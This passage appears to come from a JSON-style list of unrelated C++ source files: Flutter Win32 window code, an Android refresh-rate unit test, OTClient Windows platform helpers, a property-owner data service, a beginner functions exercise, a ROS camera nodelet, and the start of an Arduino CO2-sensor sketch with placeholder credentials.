window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n * Copyright 2019 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#undef LOG_TAG\n#define LOG_TAG \"SchedulerUnittests\"\n\n#include <gmock/gmock.h>\n#include <log/log.h>\n#include <thread>\n\n#include \"Scheduler/RefreshRateStats.h\"\n#include \"mock/MockTimeStats.h\"\n\nusing namespace std::chrono_literals;\nusing android::hardware::graphics::composer::hal::PowerMode;\nusing testing::_;\nusing testing::AtLeast;\n\nnamespace android::scheduler {\n\nclass RefreshRateStatsTest : public testing::Test {\nprotected:\n    RefreshRateStatsTest();\n    ~RefreshRateStatsTest();\n\n    void resetStats(Fps fps) {\n        mRefreshRateStats = std::make_unique<RefreshRateStats>(mTimeStats, fps, PowerMode::OFF);\n    }\n\n    mock::TimeStats mTimeStats;\n    std::unique_ptr<RefreshRateStats> mRefreshRateStats;\n};\n\nRefreshRateStatsTest::RefreshRateStatsTest() {\n    const ::testing::TestInfo* const test_info =\n            ::testing::UnitTest::GetInstance()->current_test_info();\n    ALOGD(\"**** Setting up for %s.%s\\n\", test_info->test_case_name(), test_info->name());\n}\n\nRefreshRateStatsTest::~RefreshRateStatsTest() {\n    const ::testing::TestInfo* const test_info =\n            ::testing::UnitTest::GetInstance()->current_test_info();\n    ALOGD(\"**** Tearing down after %s.%s\\n\", test_info->test_case_name(), test_info->name());\n}\n\nnamespace {\n\nTEST_F(RefreshRateStatsTest, oneMode) {\n    resetStats(90_Hz);\n\n    EXPECT_CALL(mTimeStats, recordRefreshRate(0, _)).Times(AtLeast(1));\n    EXPECT_CALL(mTimeStats, recordRefreshRate(90, _)).Times(AtLeast(1));\n\n    auto times = mRefreshRateStats->getTotalTimes();\n    ASSERT_TRUE(times.contains(\"ScreenOff\"));\n    EXPECT_EQ(1u, times.size());\n\n    // Screen is off by default.\n    std::chrono::milliseconds screenOff = times.get(\"ScreenOff\")->get();\n    std::this_thread::sleep_for(std::chrono::milliseconds(2));\n    times = mRefreshRateStats->getTotalTimes();\n\n    EXPECT_LT(screenOff, times.get(\"ScreenOff\")->get());\n    EXPECT_FALSE(times.contains(\"90.00 Hz\"));\n\n    mRefreshRateStats->setRefreshRate(90_Hz);\n    mRefreshRateStats->setPowerMode(PowerMode::ON);\n    screenOff = mRefreshRateStats->getTotalTimes().get(\"ScreenOff\")->get();\n    std::this_thread::sleep_for(std::chrono::milliseconds(2));\n    times = mRefreshRateStats->getTotalTimes();\n\n    EXPECT_EQ(screenOff, times.get(\"ScreenOff\")->get());\n    ASSERT_TRUE(times.contains(\"90.00 Hz\"));\n    EXPECT_LT(0ms, times.get(\"90.00 Hz\")->get());\n\n    mRefreshRateStats->setPowerMode(PowerMode::DOZE);\n    const auto ninety = mRefreshRateStats->getTotalTimes().get(\"90.00 Hz\")->get();\n    std::this_thread::sleep_for(std::chrono::milliseconds(2));\n    times = mRefreshRateStats->getTotalTimes();\n\n    EXPECT_LT(screenOff, times.get(\"ScreenOff\")->get());\n    EXPECT_EQ(ninety, times.get(\"90.00 Hz\")->get());\n\n    mRefreshRateStats->setRefreshRate(90_Hz);\n    screenOff = mRefreshRateStats->getTotalTimes().get(\"ScreenOff\")->get();\n    std::this_thread::sleep_for(std::chrono::milliseconds(2));\n    times = mRefreshRateStats->getTotalTimes();\n\n    // Stats are not updated while the screen is off.\n    EXPECT_LT(screenOff, times.get(\"ScreenOff\")->get());\n    EXPECT_EQ(ninety, times.get(\"90.00 Hz\")->get());\n}\n\nTEST_F(RefreshRateStatsTest, twoModes) {\n    resetStats(90_Hz);\n\n    EXPECT_CALL(mTimeStats, recordRefreshRate(0, _)).Times(AtLeast(1));\n    EXPECT_CALL(mTimeStats, recordRefreshRate(60, _)).Times(AtLeast(1));\n    EXPECT_CALL(mTimeStats, recordRefreshRate(90, _)).Times(AtLeast(1));\n\n    auto times = mRefreshRateStats->getTotalTimes();\n    ASSERT_TRUE(times.contains(\"ScreenOff\"));\n    EXPECT_EQ(1u, times.size());\n\n    // Screen is off by default.\n    std::chrono::milliseconds screenOff = times.get(\"ScreenOff\")->get();\n    std::this_thread::sleep_for(std::chrono::milliseconds(2));\n    times = mRefreshRateStats->getTotalTimes();\n\n    EXPECT_LT(screenOff, times.get(\"ScreenOff\")->get());\n    EXPECT_FALSE(times.contains(\"60.00 Hz\"));\n    EXPECT_FALSE(times.contains(\"90.00 Hz\"));\n\n    mRefreshRateStats->setRefreshRate(90_Hz);\n    mRefreshRateStats->setPowerMode(PowerMode::ON);\n    screenOff = mRefreshRateStats->getTotalTimes().get(\"ScreenOff\")->get();\n    std::this_thread::sleep_for(std::chrono::milliseconds(2));\n    times = mRefreshRateStats->getTotalTimes();\n\n    EXPECT_EQ(screenOff, times.get(\"ScreenOff\")->get());\n    ASSERT_TRUE(times.contains(\"90.00 Hz\"));\n    EXPECT_LT(0ms, times.get(\"90.00 Hz\")->get());\n\n    mRefreshRateStats->setRefreshRate(60_Hz);\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/*\n * Copyright (c) 2010-2022 OTClient <https://github.com/edubart/otclient>\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n#ifdef WIN32\n\n#include <tchar.h>\n#include <framework/stdext/stdext.h>\n\n#include \"platform.h\"\n\nvoid Platform::init(std::vector<std::string>& args)\n{\n    processArgs(args);\n\n    setDevice({ Desktop, Windows });\n}\n\nvoid Platform::processArgs(std::vector<std::string>& args)\n{\n    int nargs;\n    wchar_t** wchar_argv = CommandLineToArgvW(GetCommandLineW(), &nargs);\n    if (!wchar_argv)\n        return;\n\n    args.clear();\n    if (wchar_argv) {\n        for (int i = 0; i < nargs; ++i)\n            args.push_back(stdext::utf16_to_utf8(wchar_argv[i]));\n    }\n}\n\nbool Platform::spawnProcess(std::string process, const std::vector<std::string>& args)\n{\n    std::string commandLine;\n    for (const auto& arg : args)\n        commandLine += stdext::format(\" \\\"%s\\\"\", arg);\n\n    stdext::replace_all(process, \"/\", \"\\\\\");\n    if (!process.ends_with(\".exe\"))\n        process += \".exe\";\n\n    const auto& wfile = stdext::utf8_to_utf16(process);\n    const auto& wcommandLine = stdext::utf8_to_utf16(commandLine);\n\n    if (reinterpret_cast<size_t>(ShellExecuteW(nullptr, L\"open\", wfile.data(), wcommandLine.data(), nullptr, SW_SHOWNORMAL)) > 32)\n        return true;\n    return false;\n}\n\nint Platform::getProcessId()\n{\n    return GetCurrentProcessId();\n}\n\nbool Platform::isProcessRunning(const std::string_view name)\n{\n    if (FindWindowA(name.data(), nullptr) != nullptr)\n        return true;\n    return false;\n}\n\nbool Platform::killProcess(const std::string_view name)\n{\n    const HWND window = FindWindowA(name.data(), nullptr);\n    if (window == nullptr)\n        return false;\n    const DWORD pid = GetProcessId(window);\n    const HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);\n    if (handle == nullptr)\n        return false;\n    const bool ok = TerminateProcess(handle, 1) != 0;\n    CloseHandle(handle);\n    return ok;\n}\n\nstd::string Platform::getTempPath()\n{\n    wchar_t path[MAX_PATH];\n    GetTempPathW(MAX_PATH, path);\n    std::string ret = stdext::utf16_to_utf8(path);\n    stdext::replace_all(ret, \"\\\\\", \"/\");\n    return ret;\n}\n\nstd::string Platform::getCurrentDir()\n{\n    wchar_t path[MAX_PATH];\n    GetCurrentDirectoryW(MAX_PATH, path);\n    std::string ret = stdext::utf16_to_utf8(path);\n    stdext::replace_all(ret, \"\\\\\", \"/\");\n    ret += \"/\";\n    return ret;\n}\n\nbool Platform::fileExists(std::string file)\n{\n    stdext::replace_all(file, \"/\", \"\\\\\");\n    const auto& wfile = stdext::utf8_to_utf16(file);\n    const DWORD dwAttrib = GetFileAttributesW(wfile.data());\n    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));\n}\n\nbool Platform::copyFile(std::string from, std::string to)\n{\n    stdext::replace_all(from, \"/\", \"\\\\\");\n    stdext::replace_all(to, \"/\", \"\\\\\");\n    if (CopyFileW(stdext::utf8_to_utf16(from).data(), stdext::utf8_to_utf16(to).data(), FALSE) == 0)\n        return false;\n    return true;\n}\n\nbool Platform::removeFile(std::string file)\n{\n    stdext::replace_all(file, \"/\", \"\\\\\");\n    if (DeleteFileW(stdext::utf8_to_utf16(file).data()) == 0)\n        return false;\n    return true;\n}\n\nticks_t Platform::getFileModificationTime(std::string file)\n{\n    stdext::replace_all(file, \"/\", \"\\\\\");\n    const auto& wfile = stdext::utf8_to_utf16(file);\n    WIN32_FILE_ATTRIBUTE_DATA fileAttrData;\n    memset(&fileAttrData, 0, sizeof(fileAttrData));\n    GetFileAttributesExW(wfile.data(), GetFileExInfoStandard, &fileAttrData);\n    ULARGE_INTEGER uli;\n    uli.LowPart = fileAttrData.ftLastWriteTime.dwLowDateTime;\n    uli.HighPart = fileAttrData.ftLastWriteTime.dwHighDateTime;\n    return uli.QuadPart;\n}\n\nvoid Platform::openUrl(std::string url)\n{\n    if (url.find(\"http://\") == std::string::npos && url.find(\"https://\") == std::string::npos)\n        url.insert(0, \"http://\");\n    ShellExecuteW(nullptr, L\"open\", stdext::utf8_to_utf16(url).data(), nullptr, nullptr, SW_SHOWNORMAL);\n}\n\nstd::string",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"stdafx.h\"\n#include \"OwnerInfoService.h\"\n\nPageVO<OwnerInfoVO> OwnerInfoService::listAllOwnerInfo(OwnerInfoQuery query)\n{\n\t//\u6784\u5efa\u8fd4\u56de\u5bf9\u8c61\n\tPageVO<OwnerInfoVO> pages;\n\tpages.setPageIndex(query.getPageIndex());\n\tpages.setPageSize(query.getPageSize());\n\n\t//\u67e5\u8be2\u6570\u636e\u603b\u6761\u6570\n\tOwnerInfoQueryDO obj;\n\tobj.setOwnerName(query.getOwnerName());\n\tobj.setRoomNum(query.getRoomNum());\n\tobj.setIdCard(query.getIdCard());\n\tobj.setPeopleId(query.getPeopleId());\n\tobj.setPhoneNum(query.getPhoneNum());\n\tOwnerInfoDAO dao;\n\n\tuint64_t count = dao.countOwnerInfo(obj);\n\tif (count <= 0)\n\t{\n\t\treturn pages;\n\t}\n\n\t//\u5206\u9875\u67e5\u8be2\u6570\u636e\n\tpages.setTotal(count);\n\tpages.calcPages();\n\tlist<OwnerInfoDO> result = dao.selectOwnerInfoWithPage(obj, query.getPageIndex(), query.getPageSize());\n\t//list<OwnerInfoDO> result = dao.selectOwnerInfoWithPage(obj, query.getPageIndex(), query.getPageSize());\n\tlist<OwnerInfoVO> vr;\n\tfor (OwnerInfoDO sub : result)\n\t{\n\t\tOwnerInfoVO vo;\n\t\tvo.setOwnerName(sub.getOwnerName());\n\t\tvo.setPeopleId(sub.getPeopleId());\n\t\tvo.setPhoneNum(sub.getPhoneNum());\n\t\tvo.setIdCard(sub.getIdCard());\n\t\tvo.setOwnerAge(sub.getOwnerAge());\n\t\tvo.setOwnerGender(sub.getOwnerGender());\n\t\tvo.setCreateStaff(sub.getCreatStaff());\n\t\tvr.push_back(vo);\n\t}\n\tpages.setRows(vr);\n\treturn pages;\n}\n\n\n//\u6dfb\u52a0\u4e1a\u4e3b\u4fe1\u606f\nuint64_t OwnerInfoService::AddOwnerInfo(OwnerInfoDTO dto) \n{\n\t//\u7ec4\u88c5\u6570\u636e\n\tOwnerInfoDO data;\n\tdata.setCreatStaff(dto.getCreatStaff());\n\tdata.setIdCard(dto.getIdCard());\n\tdata.setOwnerAge(dto.getOwnerAge());\n\tdata.setOwnerGender(dto.getOwnerGender());\n\tdata.setOwnerName(dto.getOwnerName());\n\tdata.setPhoneNum(dto.getPhoneNum());\n\tdata.setRemark(dto.getRemark());\n\t//\u6267\u884c\u6570\u636e\u6dfb\u52a0\n\tOwnerInfoDAO dao;\n\treturn dao.addOwnerInfo(data);\n}\n\n\n//\u4fee\u6539\u4e1a\u4e3b\u4fe1\u606f\nlong OwnerInfoService::ModifyOwnerInfo(OwnerInfoDTO dto)\n{\n\t//\u7ec4\u88c5\u4f20\u8f93\u6570\u636e\n\tOwnerInfoDO data;\n\tdata.setIdCard(dto.getIdCard());\n\tdata.setPeopleId(dto.getPeopleId());\n\tdata.setOwnerAge(dto.getOwnerAge());\n\tdata.setOwnerGender(dto.getOwnerGender());\n\tdata.setOwnerName(dto.getOwnerName());\n\tdata.setPhoneNum(dto.getPhoneNum());\n\tdata.setRemark(dto.getRemark());\n\t//\u6267\u884c\u6570\u636e\u4fee\u6539\n\tOwnerInfoDAO dao;\n\treturn dao.modifyOwnerInfo(data) == 1;\n}\n\n\n//\u5220\u9664\u4e1a\u4e3b\u4fe1\u606f\nint OwnerInfoService::DeleteOwnerInfo(std::string id)\n{\n\tOwnerInfoDAO dao;\n\treturn dao.deleteById(id) == 1;\n}",
    "\ufeff#include <iostream>\nusing namespace std;\n\nint Sum(int a, int b = 0);\nint Diff(int a, int b);\nint Prod(int a, int b);\ndouble Quot(int a, int b);\ndouble Factorial(int n);\ndouble Power(double a, int n);\n\n//#define CALC\n//#define FACTORIAL\n#define POWER\n\nvoid main()\n{\n\tsetlocale(LC_ALL, \"\");\n\tcout << \"Hello Functions\" << endl;\n\n#ifdef CALC\n\tint a, b;\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u0432\u0430 \u0447\u0438\u0441\u043b\u0430: \"; cin >> a >> b;\n\tint c = Sum(a, b);\n\tcout << a << \" + \" << b << \" = \" << c << endl;\n\tcout << a << \" - \" << b << \" = \" << Diff(a, b) << endl;\n\tcout << a << \" * \" << b << \" = \" << Prod(a, b) << endl;\n\tcout << a << \" / \" << b << \" = \" << Quot(a, b) << endl;\n\n#endif // CALC\n\n#ifdef FACTORIAL\n\tint n;\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e: \"; cin >> n;\n\tcout << n << \"! = \" << Factorial(n) << endl;\n#endif // FACTORIAL\n\n#ifdef POWER\n\tdouble a;\n\tint\tn;\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043e\u0441\u043d\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0442\u0435\u043f\u0435\u043d\u0438: \"; cin >> a;\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u043e\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u0441\u0442\u0435\u043f\u0435\u043d\u0438: \"; cin >> n;\n\tcout << \"\u041f\u043e\u043b\u0443\u0447\u0435\u043d\u043d\u044b\u0439 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442: \" << Power(a, n) << endl;\n#endif // POWER\n}\n\nint Sum(int a, int b)\n{\n\tint c = a + b;\n\treturn c;\n}\nint Diff(int a, int b)\n{\n\tint c = a - b;\n\treturn a - b;\n}\nint Prod(int a, int b)\n{\n\treturn a * b;\n}\ndouble Quot(int a, int b)\n{\n\treturn (double) a / b;\n}\ndouble Factorial(int n)\n{\n\tdouble f = 1;\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tf *= i;\n\t}\n\treturn f;\n}\ndouble Power(double a, int n)\n{\n\tdouble N = 1;\n\tif (n < 0)\n\t{\n\t\ta = 1 / a;\n\t\tn = -n;\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tN *= a;\n\t}\n\treturn N;\n}\n",
    "// Software License Agreement (BSD License)\n//\n// Copyright (c) 2021, National Institute of Advanced Industrial Science and Technology (AIST)\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions\n// are met:\n//\n//  * Redistributions of source code must retain the above copyright\n//    notice, this list of conditions and the following disclaimer.\n//  * Redistributions in binary form must reproduce the above\n//    copyright notice, this list of conditions and the following\n//    disclaimer in the documentation and/or other materials provided\n//    with the distribution.\n//  * Neither the name of National Institute of Advanced Industrial\n//    Science and Technology (AIST) nor the names of its contributors\n//    may be used to endorse or promote products derived from this software\n//    without specific prior written permission.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n// \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n// FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n// COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n// BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n// LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n// LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n// ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n// POSSIBILITY OF SUCH DAMAGE.\n//\n// Author: Toshio Ueshiba\n//\n/*!\n *  \\file\tnodelet.cpp\n */\n#include \"Camera.h\"\n#include <nodelet/nodelet.h>\n#include <pluginlib/class_list_macros.h>\n\nnamespace aist_phoxi_camera\n{\n/************************************************************************\n*  class CameraNodelet\t\t\t\t\t\t\t*\n************************************************************************/\nclass CameraNodelet : public nodelet::Nodelet\n{\n  public:\n    CameraNodelet()\t\t\t\t\t\t\t{}\n\n    virtual void\tonInit()\t\t\t\t\t;\n    void\t\ttimer_callback(const ros::TimerEvent&)\t\t;\n\n  private:\n    boost::shared_ptr<Camera>\t_node;\n    ros::Timer\t\t\t_timer;\n};\n\nvoid\nCameraNodelet::onInit()\n{\n    NODELET_INFO(\"aist_phoxi_camera::CameraNodelet::onInit()\");\n\n    auto&\tnh = getPrivateNodeHandle();\n    _node.reset(new Camera(nh, getName()));\n    _timer = nh.createTimer(ros::Duration(1.0/_node->rate()),\n\t\t\t    &CameraNodelet::timer_callback, this);\n\n}\n\nvoid\nCameraNodelet::timer_callback(const ros::TimerEvent&)\n{\n    _node->tick();\n}\n\n}\n\nPLUGINLIB_EXPORT_CLASS(aist_phoxi_camera::CameraNodelet, nodelet::Nodelet);\n",
    "#include <Arduino.h>\n#include \"MHZ19.h\"                                        \n#include <HardwareSerial.h>\n#include <WiFi.h>                      \n#include <ArduinoJson.h>\n#include <HTTPClient.h>\n#include <esp_wifi.h>\n#include <vector>\n\n#define BAUDRATE 9600                                      // Device to MH-Z19 Serial baudrate (should not be changed)\nconst char* ssid = \"Wifi SSID\";                                 // WiFi SSID\nconst char* password = \"WIFI PASSWORD\";                         // WiFi Password\nconst char* api_url = \"https://backend.thinger.io/v3/users/...\";                    // Thinger.io host\nconst String token = \"Bearer ABCABCABC\";\n\nMHZ19 myMHZ19;                                             // Constructor for library\nHardwareSerial mySerial(2);                   \nWiFiClientSecure client;\n\nstd::vector<String> offlineData;\n\nunsigned long getDataTimer = 0;\n\nvoid setup()\n{\n    